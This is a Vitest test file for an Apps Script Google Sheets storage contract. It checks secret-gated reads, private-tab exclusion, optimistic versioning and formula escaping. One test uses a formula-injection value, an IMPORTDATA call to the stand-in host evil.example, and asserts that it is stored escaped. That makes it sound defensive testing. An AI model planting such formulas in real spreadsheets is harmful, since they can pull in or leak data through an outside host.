import { describe, expect, it } from "vitest";
import { createSheetRuntime } from "./helpers/sheet-runtime";

describe("Apps Script storage contract", () => {
  it("requires the server secret and excludes personal source/review tabs from operational reads", () => {
    const runtime = createSheetRuntime({ "Source History": [{sourceRow: 3, sponsorName: "Private personal gift"}] });
    expect(runtime.call({action: "read", secret: "wrong"}).ok).toBe(false);
    const result = runtime.call({action: "read", secret: "fixture-only-secret"});
    expect(result.ok).toBe(true); expect(result.data).not.toHaveProperty("Source History"); expect(result.data).not.toHaveProperty("Import Review");
  });
  it("updates an existing research row in place, preserves other fields and supports idempotent retry", () => {
    const runtime = createSheetRuntime({ Profiles: [{slug:"acme", notes:"Before", waterFocus:"unknown", version:"v1"}] });
    const op = {tab:"Profiles", key:"acme", expectedVersion:"v1", row:{slug:"acme", notes:"After"}};
    const result = runtime.call({action:"mutate", secret:"fixture-only-secret", operations:[op]});
    expect(result.ok).toBe(true); expect(runtime.sheets.Profiles.getLastRow()).toBe(2);
    const after = runtime.call({action:"read", secret:"fixture-only-secret"}).data.Profiles[0];
    expect(after.notes).toBe("After"); expect(after.waterFocus).toBe("unknown"); expect(after.version).not.toBe("v1");
    expect(runtime.call({action:"mutate", secret:"fixture-only-secret", operations:[op]}).ok).toBe(true);
  });
  it("rejects an entire stale batch before making any write", () => {
    const runtime = createSheetRuntime({Profiles:[{slug:"acme",notes:"Other editor",version:"v2"}]});
    const result = runtime.call({action:"mutate",secret:"fixture-only-secret",operations:[
      {tab:"Search Log",key:"new",row:{id:"new",query:"Acme"}},
      {tab:"Profiles",key:"acme",expectedVersion:"v1",row:{slug:"acme",notes:"Stale edit"}},
    ]});
    expect(result.ok).toBe(false); expect(result.error).toContain("Conflict"); expect(runtime.sheets["Search Log"].getLastRow()).toBe(1);
  });
  it("bumps versions for edits made directly in Sheets", () => {
    const runtime = createSheetRuntime({Profiles:[{slug:"acme",version:"v1"}]});
    runtime.context.onEdit({range:runtime.sheets.Profiles.getRange(2,9)});
    expect(runtime.call({action:"read",secret:"fixture-only-secret"}).data.Profiles[0].version).not.toBe("v1");
  });
  it("prevents formulas in user text and rejects writes to private source tabs", () => {
    const runtime = createSheetRuntime();
    const result = runtime.call({action:"mutate",secret:"fixture-only-secret",operations:[{tab:"Profiles",key:"acme",row:{slug:"acme",notes:"=IMPORTDATA(\"https://evil.example\")"}}]});
    expect(result.ok).toBe(true); expect(runtime.sheets.Profiles.values[1][8]).toBe("'=IMPORTDATA(\"https://evil.example\")");
    expect(runtime.call({action:"mutate",secret:"fixture-only-secret",operations:[{tab:"Source History",key:"1",row:{}}]}).ok).toBe(false);
  });
});
